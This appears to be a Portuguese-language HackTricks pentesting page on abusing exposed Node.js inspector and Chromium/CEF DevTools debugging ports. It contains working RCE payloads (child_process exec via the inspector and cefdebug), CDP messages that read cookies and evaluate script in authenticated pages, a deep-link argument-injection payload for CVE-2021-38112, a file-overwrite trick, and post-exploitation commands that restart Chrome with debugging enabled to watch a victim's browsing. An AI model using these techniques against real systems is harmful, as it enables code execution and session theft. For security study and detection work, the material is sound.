# Abuso do debug do Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Exemplos históricos práticos incluem o walkthrough Multimaster e o ataque ao debugger do Visual Studio Code CVE-2019-1414; use-os como contexto específico de versão, em vez de presumir que todo alvo atual de Electron ou Chromium exponha as mesmas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Informações básicas

[Da documentação](https://nodejs.org/learn/getting-started/debugging): Quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de debug. Por **padrão**, ele escuta no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **único**.<sup>[[4]](#references)</sup>

Os clientes do inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta pode conseguir executar código arbitrário em nome do processo Node.js (**possível escalonamento de privilégios**).<sup>[[4]](#references)</sup>

Há várias maneiras de iniciar um inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Quando você inicia um processo sob inspeção, algo como isto aparecerá:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processos baseados em **CEF** (**Chromium Embedded Framework**) podem expor um depurador com `--remote-debugging-port=9222`. Isso expõe o navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), em vez de um inspetor do Node.js, portanto payloads baseados em `process` do Node.js não são diretamente aplicáveis por padrão.<sup>[[2]](#references)[[5]](#references)</sup>

Ao iniciar um navegador em modo de depuração, algo assim será exibido:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerando e controlando um endpoint CDP

Os endpoints HTTP de descoberta distinguem o WebSocket do **browser** dos WebSockets de **target** individuais (aba, worker, extensão etc.). Consulte `/json/version` para obter o endpoint do browser e `/json/list` para os targets; em seguida, os valores `webSocketDebuggerUrl` retornados podem ser controlados diretamente com mensagens semelhantes a JSON-RPC do CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Por exemplo, conecte-se com `websocat "$BROWSER_WS"` e envie `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Em um target de página (`websocat "$PAGE_WS"`), `Runtime.evaluate` executa no renderer, e `Page.captureScreenshot` retorna uma captura de tela codificada em base64. `document.cookie` não pode revelar cookies `HttpOnly`, enquanto `Storage.getCookies` solicita os cookies armazenados pelo navegador.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browsers, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Sites abertos em um navegador web podem fazer requisições WebSocket e HTTP de acordo com o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão de debugger exclusivo**. A **same-origin-policy** **impede** que sites façam **essa conexão HTTP**. Para oferecer segurança adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **cabeçalhos 'Host'** da conexão especificam um **endereço IP** ou exatamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Essas **medidas de segurança impedem a exploração do inspector** para executar código **apenas enviando uma requisição HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).<sup>[[4]](#references)</sup>

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo Node.js em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes; portanto, isso pode conceder **acesso privilegiado a informações dentro do processo**, mas não uma escalada de privilégios direta.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.<sup>[[6]](#references)</sup>

### Conectar-se ao inspetor/depurador

Para se conectar a um **navegador baseado em Chromium**, é possível acessar as URLs `chrome://inspect` ou `edge://inspect` para Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Depois, aparecerá uma URL para acessar o depurador. Por exemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar-se ao inspetor/depurador: Para se conectar a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode se conectar a um depurador/inspetor com:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Observe que **exploits de RCE em NodeJS não funcionarão** se você estiver conectado a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (é necessário verificar a API para encontrar coisas interessantes para fazer com ela).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE no Debugger/Inspector do NodeJS

> [!TIP]
> Se você chegou aqui procurando como obter [**RCE a partir de um XSS no Electron, confira esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas maneiras comuns de obter **RCE** quando você consegue **se conectar** a um inspector do Node são usar algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads do Chrome DevTools Protocol

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Nesta seção, vou apenas listar coisas interessantes que encontrei que as pessoas usaram para explorar esse protocolo.

### Restrição do perfil padrão no Chrome 136+

A partir do **Chrome 136**, o Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando eles têm como alvo o **diretório de dados padrão do Chrome**. A opção deve ser combinada com um `--user-data-dir` não padrão, cuja chave de criptografia separada e estado isolado do navegador impedem que a simples técnica baseada em flags exponha o perfil autenticado normal do usuário. Não se deve presumir que essa restrição específica do Chrome se aplique a versões mais antigas do Chrome, ao Chrome for Testing, a aplicações Electron/CEF ou a outros derivados do Chromium sem verificação.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Portanto, ver um processo atual do Chrome iniciado apenas com `--remote-debugging-port` **não** prova que o CDP foi ativado. Confirme o listener e `/json/version`, e determine qual perfil realmente o utiliza.<sup>[[14]](#references)</sup>

### Injeção de parâmetros via Deep Links

Em [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicativo baseado em CEF **registrou uma URI** personalizada no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava o aplicativo baseado em CEF** com uma configuração parcialmente construída a partir dessa URI.<sup>[[8]](#references)</sup>

Descobriu-se que os parâmetros da URI eram decodificados por URL e usados para iniciar o aplicativo básico CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse qualquer coisa.<sup>[[8]](#references)</sup>

Assim, um payload como:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Executará um calc.exe.<sup>[[8]](#references)</sup>

### Sobrescrever arquivos

Altere a pasta onde **os arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** da aplicação, usado com frequência, com seu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE e exfiltration via WebDriver

A STAR Labs mostrou que serviços WebDriver/CDP expostos podem permitir leitura arbitrária de arquivos e RCE; em algumas configurações, DNS rebinding pode completar a cadeia de exploit.<sup>[[9]](#references)</sup>

O serviço WebDriver do ChromeDriver é distinto do Chrome DevTools/CDP. A capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) seleciona o executável do navegador iniciado para uma nova sessão. Se um caller sem privilégios puder acessar um serviço ChromeDriver executado como root e enviar uma sessão com um caminho de executável controlado pelo caller, essa inicialização poderá atravessar o limite de privilégios do serviço. Uma resposta vazia de `/sessions` não determina se novas sessões podem ser criadas. Inspecione o proprietário do processo, a acessibilidade real do listener, a autorização de sessão, o acesso ao executável e as restrições de execução antes de concluir que o caminho é utilizável; apenas o nome do processo ou a porta usual não são suficientes. [As orientações de segurança do Google](https://developer.chrome.com/docs/chromedriver/security-considerations) recomendam executar o ChromeDriver com uma conta sem privilégios. A enumeração passiva não deve criar uma sessão WebDriver.

Para outros casos históricos de automação de navegador e segurança do Chromium, consulte o write-up do Counter WebDriver e os issues 773, 1742 e 1944 do Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Ativando CDP dentro de um processo Chromium em execução

No Windows, o [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) demonstrou que a restrição da linha de comando não é a única forma de ativar o CDP: código que já consegue injetar em um `msedge.exe` existente pode chamar o método não exportado do Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` e expor o perfil ativo autenticado sem reiniciar o navegador.<sup>[[15]](#references)</sup>

A cadeia demonstrada injeta uma DLL com `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, resolve símbolos internos do Edge (primeiro a partir de PDBs e, depois, com assinaturas de bytes específicas da versão), subclassifica a janela do navegador e envia uma mensagem para que a chamada final de inicialização do servidor seja executada na **thread de UI** do navegador. O socket é vinculado ao loopback, após o que primitivas CDP comuns podem recuperar cookies, capturar abas, inspecionar o tráfego de rede ou avaliar JavaScript em páginas autenticadas.<sup>[[15]](#references)</sup>

> [!WARNING]
> Esta é uma técnica de **post-compromise/injeção em processo**, não um bypass de rede não autenticado. Depende muito da build, pois os símbolos C++ relevantes não são exportados e as assinaturas podem mudar após atualizações do navegador.<sup>[[15]](#references)</sup>

Para detecção, não dependa apenas da telemetria da linha de comando `--remote-debugging-*`: correlacione também handles e operações de memória incomuns contra processos do navegador (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, criação de threads), injeção de DLL e sockets de listening inesperados no loopback pertencentes ao Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que usa um navegador baseado em Chromium, uma técnica histórica consistia em reiniciar o navegador com o debugging ativado e encaminhar a porta loopback. Isso pode expor o estado de navegação da vítima em produtos/builds que ainda aceitam o perfil selecionado, mas o Chrome 136+ não aceitará isso para o diretório de dados padrão.<sup>[[7]](#references)[[14]](#references)</sup>

O comando original de reinicialização é mantido abaixo para alvos mais antigos/específicos de versão. O segundo comando é a forma compatível com o Chrome atual, mas cria um perfil isolado em vez de reabrir o estado autenticado normal da vítima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Para o relançamento, as extensões e as técnicas de CDP específicas do Chromium no macOS, consulte [Injeção no Chromium do macOS](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Ferramenta de inspeção e exploração do debugger do CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Execução Remota de Código no Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guia de debugging do Node.js - Primeiros passos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocolo do Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup do corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Pós-exploração: abusando do recurso de debugging do Chrome para observar e controlar remotamente sessões de navegação](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Execução Remota de Código no AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Você está falando comigo? - RCE no WebDriver via DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contra o WebDriver - De bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Problema 773 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Problema 1742 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Problema 1944 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Alterações nas opções de debugging remoto para melhorar a segurança - Chrome para desenvolvedores](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injetando CDP em um navegador Edge em execução: uma análise detalhada da instrumentação do navegador em tempo de execução](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
